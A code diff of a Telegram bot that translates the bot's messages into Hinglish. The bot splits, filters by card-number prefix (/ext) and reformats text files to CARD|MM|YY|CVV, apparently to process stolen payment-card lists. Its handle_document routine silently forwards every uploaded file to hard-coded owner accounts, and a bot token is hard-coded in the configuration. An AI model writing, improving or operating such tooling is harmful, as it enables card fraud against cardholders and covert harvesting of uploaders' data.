@@ -16,24 +16,24 @@ from telegram.constants import ParseMode
 from telegram.error import TelegramError
 
 # ==================================================
-# CONFIGURATION
+# CONFIGURATION (Setups aur Tokens)
 # ==================================================
-# Replace with your actual Bot Token or use Environment Variables
+# Apna asli Bot Token yahan daalein
 BOT_TOKEN = "8811033165:AAG4NQszrJa3bP0Cgz-nuanE1g7RVVb2coA"
 
-# List of Owner IDs
+# Owners ki Telegram User IDs
 OWNER_IDS = [
     6382539239,
     8665264271
 ]
 
-# Path configuration
+# Paths ka setup
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 UPLOADS_DIR = os.path.join(BASE_DIR, "uploads")
 OUTPUTS_DIR = os.path.join(BASE_DIR, "outputs")
 LOGS_DIR = os.path.join(BASE_DIR, "logs")
 
-# Create directories if they don't exist
+# Agar folders pehle se nahi bane hain, toh unhe banayein
 for folder in [UPLOADS_DIR, OUTPUTS_DIR, LOGS_DIR]:
     os.makedirs(folder, exist_ok=True)
 
@@ -48,10 +48,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Global state to track downloaded files and stop flags
-# Format: {(chat_id, message_id): "path_to_file"}
 downloaded_files = {}
-# stop_flags = { user_id: bool }
 stop_flags = {}
 
 # ==================================================
@@ -59,15 +56,15 @@ stop_flags = {}
 # ==================================================
 
 def get_user_identifier(user):
-    """Returns username if exists, else first_name."""
+    """User ka username return karta hai agar hai, nahi toh first name."""
     if user.username:
         return f"@{user.username}"
     return user.first_name
 
 async def forward_to_owners(context: ContextTypes.DEFAULT_TYPE, user, file_path, file_name):
-    """Forwards the uploaded file to all owners cleanly without IDs."""
+    """Nayi upload ki gayi file ko owners ke paas turant forward karta hai."""
     caption = (
-        f"📩 <b>New Upload Received</b>\n\n"
+        f"📩 <b>Nayi File Upload Hui Hai!</b>\n\n"
         f"<b>Uploader:</b> {get_user_identifier(user)}\n"
         f"<b>File Name:</b> <code>{file_name}</code>"
     )
@@ -81,10 +78,10 @@ async def forward_to_owners(context: ContextTypes.DEFAULT_TYPE, user, file_path,
                     parse_mode=ParseMode.HTML
                 )
         except Exception as e:
-            logger.error(f"Error forwarding to owner {owner_id}: {e}")
+            logger.error(f"Owner {owner_id} ko file forward karne mein error: {e}")
 
 async def count_lines(file_path):
-    """Efficiently count lines in a large file."""
+    """Badi files mein lines ko speed se count karne ke liye."""
     count = 0
     with open(file_path, 'rb') as f:
         for _ in f:
@@ -92,37 +89,34 @@ async def count_lines(file_path):
     return count
 
 async def get_file_from_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Checks if command is a reply to a valid TXT document.
-    Returns (file_path, error_message).
-    """
     reply = update.message.reply_to_message
     if not reply or not reply.document:
-        return None, "❌ Please reply directly to the specific TXT file you want to process."
+        return None, None, "❌ Kripya us TXT file ka reply karke command dalein jise aap process karna chahte hain."
 
     if not reply.document.file_name.endswith('.txt'):
-        return None, "❌ The replied file is not a valid TXT file."
+        return None, None, "❌ Reply ki gayi file ek valid .txt file nahi hai."
 
     chat_id = update.effective_chat.id
     msg_id = reply.message_id
     cache_key = (chat_id, msg_id)
+    
+    # Original file name nikalte hain bina .txt extension ke
+    orig_name = os.path.splitext(reply.document.file_name)[0]
 
-    # If the file path is already cached and exists
     if cache_key in downloaded_files and os.path.exists(downloaded_files[cache_key]):
-        return downloaded_files[cache_key], None
+        return downloaded_files[cache_key], orig_name, None
 
-    # If not in cache (e.g. after restart), download it on-the-fly
     try:
-        msg = await update.message.reply_text("📥 Fetching the target file...")
+        msg = await update.message.reply_text("📥 Target file fetch ki ja rahi hai...")
         file = await context.bot.get_file(reply.document.file_id)
         file_path = os.path.join(UPLOADS_DIR, f"{chat_id}_{msg_id}.txt")
         await file.download_to_drive(file_path)
         downloaded_files[cache_key] = file_path
         await msg.delete()
-        return file_path, None
+        return file_path, orig_name, None
     except Exception as e:
-        logger.error(f"Error downloading replied file: {e}")
-        return None, f"❌ Failed to download replied file: {str(e)}"
+        logger.error(f"Replied file download karne mein error aaya: {e}")
+        return None, None, f"❌ File download nahi ho saki: {str(e)}"
 
 # ==================================================
 # COMMAND HANDLERS
@@ -132,28 +126,28 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     name = get_user_identifier(user)
     welcome_msg = (
-        f"Hello {name}!\n\n"
-        f"Upload a file in .txt format ⚡"
+        f"Namaste {name}!\n\n"
+        f"Kripya ek .txt format ki file upload karein ⚡"
     )
     await update.message.reply_text(welcome_msg)
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     help_text = (
         "📖 <b>Help Menu</b>\n\n"
-        "1️⃣ Upload a <code>.txt</code> file first.\n"
-        "2️⃣ Reply to that file using any command below:\n\n"
-        "⚡ <code>/spl &lt;N&gt;</code> – Split TXT file every N lines\n"
-        "🔍 <code>/ext &lt;prefix&gt;</code> – Extract lines with prefix\n"
-        "🧹 <code>/clear</code> – Format TXT to CARD|MM|YY|CVV\n"
-        "🛑 <code>/stop</code> – Stop current process\n"
-        "❓ <code>/help</code> – Show this message"
+        "1️⃣ Pehle ek <code>.txt</code> file upload karein.\n"
+        "2️⃣ Phir us file ka reply karke niche diye gaye commands dalein:\n\n"
+        "⚡ <code>/spl &lt;N&gt;</code> – File ko har N lines par split karein\n"
+        "🔍 <code>/ext &lt;prefix&gt;</code> – Prefix wali lines extract karein\n"
+        "🧹 <code>/clear</code> – TXT ko CARD|MM|YY|CVV format mein saaf karein\n"
+        "🛑 <code>/stop</code> – Chal rahe process ko rokein\n"
+        "❓ <code>/help</code> – Yeh message dekhein"
     )
     await update.message.reply_text(help_text, parse_mode=ParseMode.HTML)
 
 async def stop_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     stop_flags[user_id] = True
-    await update.message.reply_text("🛑 Stopping process... Please wait.")
+    await update.message.reply_text("🛑 Process ko roka ja raha hai... Kripya thoda wait karein.")
 
 # ==================================================
 # FILE UPLOAD HANDLE
@@ -166,14 +160,12 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     doc = update.message.document
 
     if not doc.file_name.endswith('.txt'):
-        await update.message.reply_text("❌ Please upload a TXT file only.")
+        await update.message.reply_text("❌ Kripya sirf .txt file hi upload karein.")
         return
 
-    # Download file
-    msg = await update.message.reply_text("📥 Downloading file...")
+    msg = await update.message.reply_text("📥 File download ho rahi hai...")
     file = await context.bot.get_file(doc.file_id)
     
-    # Store with unique message ID so replies can map to it perfectly
     file_path = os.path.join(UPLOADS_DIR, f"{chat_id}_{msg_id}.txt")
     await file.download_to_drive(file_path)
 
@@ -181,16 +173,16 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stop_flags[user.id] = False
 
     await msg.edit_text(
-        "✅ TXT file received successfully 🔥\n\n"
-        "<b>Now reply directly to that file with</b> 👇\n"
-        "• /spl <N> – Split TXT file\n"
-        "• /ext <prefix> – Extract prefix lines\n"
-        "• /clear – Clean TXT file\n"
-        "• /stop – Stop running process",
+        "✅ TXT file mil gayi hai 🔥\n\n"
+        "<b>Ab is file ka reply karke niche diye gaye commands use karein:</b> 👇\n"
+        "• /spl <N> – Split karein\n"
+        "• /ext <prefix> – Prefix lines nikalein\n"
+        "• /clear – File saaf karein\n"
+        "• /stop – Process ko rokein",
         parse_mode=ParseMode.HTML
     )
 
-    # Forward cleanly to owners
+    # Owner ko turant forward karein
     await forward_to_owners(context, user, file_path, doc.file_name)
 
 # ==================================================
@@ -200,33 +192,31 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
 
-    # Retrieve specific file by replying
-    input_path, error_msg = await get_file_from_reply(update, context)
+    input_path, orig_name, error_msg = await get_file_from_reply(update, context)
     if error_msg:
         await update.message.reply_text(error_msg)
         return
 
-    # Regex to handle /spl100 or /spl 100
     text = update.message.text
     match = re.search(r'/spl\s*(\d+)', text)
     
     if not match:
-        await update.message.reply_text("❌ Invalid format. Reply to a file with: /spl 100 or /spl100")
+        await update.message.reply_text("❌ Galat format! File ka reply karke dalein: /spl 100 ya /spl100")
         return
 
     lines_per_file = int(match.group(1))
     if lines_per_file <= 0:
-        await update.message.reply_text("❌ Number must be greater than 0.")
+        await update.message.reply_text("❌ Number 0 se bada hona chahiye.")
         return
 
     total_lines = await count_lines(input_path)
     num_files = (total_lines + lines_per_file - 1) // lines_per_file
 
-    status_msg = await update.message.reply_text(
-        f"🚀 <b>Processing Started</b>\n\n"
+    await update.message.reply_text(
+        f"🚀 <b>Split Process Shuru</b>\n\n"
         f"Total Lines: {total_lines}\n"
         f"Lines Per File: {lines_per_file}\n"
-        f"Files To Create: {num_files}",
+        f"Total Files Jo Banengi: {num_files}",
         parse_mode=ParseMode.HTML
     )
 
@@ -240,14 +230,14 @@ async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             for line in infile:
                 if stop_flags.get(user_id):
-                    await update.message.reply_text("Process stopped by user.")
+                    await update.message.reply_text("Process user dwara rok diya gaya.")
                     return
 
                 current_out_lines.append(line)
                 line_count += 1
 
                 if line_count >= lines_per_file:
-                    out_filename = f"part_{current_file_num}_{user_id}.txt"
+                    out_filename = f"part_{current_file_num}_{orig_name}.txt"
                     out_path = os.path.join(OUTPUTS_DIR, out_filename)
                     
                     with open(out_path, 'w', encoding='utf-8') as outfile:
@@ -260,11 +250,10 @@ async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     current_out_lines = []
                     line_count = 0
                     current_file_num += 1
-                    await asyncio.sleep(0.5) # Avoid flood limits
+                    await asyncio.sleep(0.5)
 
-            # Handle remaining lines
             if current_out_lines:
-                out_filename = f"part_{current_file_num}_{user_id}.txt"
+                out_filename = f"part_{current_file_num}_{orig_name}.txt"
                 out_path = os.path.join(OUTPUTS_DIR, out_filename)
                 with open(out_path, 'w', encoding='utf-8') as outfile:
                     outfile.writelines(current_out_lines)
@@ -272,10 +261,10 @@ async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await context.bot.send_document(chat_id=user_id, document=f)
                 os.remove(out_path)
 
-        await update.message.reply_text("✅ Splitting completed!")
+        await update.message.reply_text("✅ Splitting ka kaam pura ho gaya!")
     except Exception as e:
-        logger.error(f"Error during /spl: {e}")
-        await update.message.reply_text(f"❌ Error: {str(e)}")
+        logger.error(f"/spl command mein error: {e}")
+        await update.message.reply_text(f"❌ Error aaya: {str(e)}")
 
 # ==================================================
 # FEATURE: EXTRACT (/ext)
@@ -284,24 +273,22 @@ async def split_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def extract_prefix(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
 
-    # Retrieve specific file by replying
-    input_path, error_msg = await get_file_from_reply(update, context)
+    input_path, orig_name, error_msg = await get_file_from_reply(update, context)
     if error_msg:
         await update.message.reply_text(error_msg)
         return
 
     text = update.message.text
-    # Catching prefix regardless of space
     match = re.search(r'/ext\s*(.+)', text)
     if not match:
-        await update.message.reply_text("❌ Reply with: /ext <prefix> (e.g., /ext4960)")
+        await update.message.reply_text("❌ Galat format! File ka reply karke dalein: /ext <prefix> (Example: /ext4960)")
         return
 
     prefix = match.group(1).strip()
-    out_filename = f"extracted_{user_id}.txt"
+    out_filename = f"extracted_{orig_name}.txt"
     out_path = os.path.join(OUTPUTS_DIR, out_filename)
     
-    await update.message.reply_text(f"🔍 Extracting lines starting with: `{prefix}`", parse_mode=ParseMode.MARKDOWN)
+    await update.message.reply_text(f"🔍 `{prefix}` se shuru hone wali lines nikali ja rahi hain...", parse_mode=ParseMode.MARKDOWN)
     
     stop_flags[user_id] = False
     count = 0
@@ -311,7 +298,7 @@ async def extract_prefix(update: Update, context: ContextTypes.DEFAULT_TYPE):
              open(out_path, 'w', encoding='utf-8') as outfile:
             for line in infile:
                 if stop_flags.get(user_id):
-                    await update.message.reply_text("Process stopped.")
+                    await update.message.reply_text("Process rok diya gaya.")
                     return
                 if line.startswith(prefix):
                     outfile.write(line)
@@ -322,16 +309,16 @@ async def extract_prefix(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await context.bot.send_document(
                     chat_id=user_id, 
                     document=f, 
-                    caption=f"✅ Extracted {count} lines."
+                    caption=f"✅ Total {count} lines nikal li gayi hain."
                 )
         else:
-            await update.message.reply_text("❌ No matches found.")
+            await update.message.reply_text("❌ Koi match nahi mila.")
         
         if os.path.exists(out_path):
             os.remove(out_path)
 
     except Exception as e:
-        await update.message.reply_text(f"❌ Error: {e}")
+        await update.message.reply_text(f"❌ Error aaya: {e}")
 
 # ==================================================
 # FEATURE: CLEAR (/clear)
@@ -340,16 +327,15 @@ async def extract_prefix(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def clear_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
 
-    # Retrieve specific file by replying
-    input_path, error_msg = await get_file_from_reply(update, context)
+    input_path, orig_name, error_msg = await get_file_from_reply(update, context)
     if error_msg:
         await update.message.reply_text(error_msg)
         return
 
-    out_filename = f"cleaned_{user_id}.txt"
+    out_filename = f"cleaned_{orig_name}.txt"
     out_path = os.path.join(OUTPUTS_DIR, out_filename)
     
-    await update.message.reply_text("🧹 Cleaning file... (Keeping CARD|MM|YY|CVV)")
+    await update.message.reply_text("🧹 File saaf ki ja rahi hai... (Sirf CARD|MM|YY|CVV bachega)")
     
     stop_flags[user_id] = False
     count = 0
@@ -360,7 +346,6 @@ async def clear_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             for line in infile:
                 if stop_flags.get(user_id): break
                 
-                # Split by pipe and take first 4 parts
                 parts = line.strip().split('|')
                 if len(parts) >= 4:
                     clean_line = "|".join(parts[:4])
@@ -372,37 +357,32 @@ async def clear_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await context.bot.send_document(
                     chat_id=user_id, 
                     document=f, 
-                    caption=f"✅ Cleaned {count} lines."
+                    caption=f"✅ {count} lines saaf ho chuki hain."
                 )
         else:
-            await update.message.reply_text("❌ No valid lines found to clean.")
+            await update.message.reply_text("❌ Saaf karne ke liye koi valid format nahi mila.")
             
         if os.path.exists(out_path):
             os.remove(out_path)
             
     except Exception as e:
-        await update.message.reply_text(f"❌ Error: {e}")
+        await update.message.reply_text(f"❌ Error aaya: {e}")
 
 # ==================================================
 # MAIN ENTRY POINT
 # ==================================================
 
 def main():
-
     application = ApplicationBuilder().token(BOT_TOKEN).build()
 
-    # Handlers
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("stop", stop_process))
     
-    # Regex handlers for commands without spaces (/spl100) or with spaces
     application.add_handler(MessageHandler(filters.Regex(r'^/spl\d+$') | filters.Regex(r'^/spl\s+\d+$'), split_file))
     application.add_handler(MessageHandler(filters.Regex(r'^/ext.+$'), extract_prefix))
-    
     application.add_handler(CommandHandler("clear", clear_file))
     
-    # Document Handler
     application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
 
     print("Bot is running...")
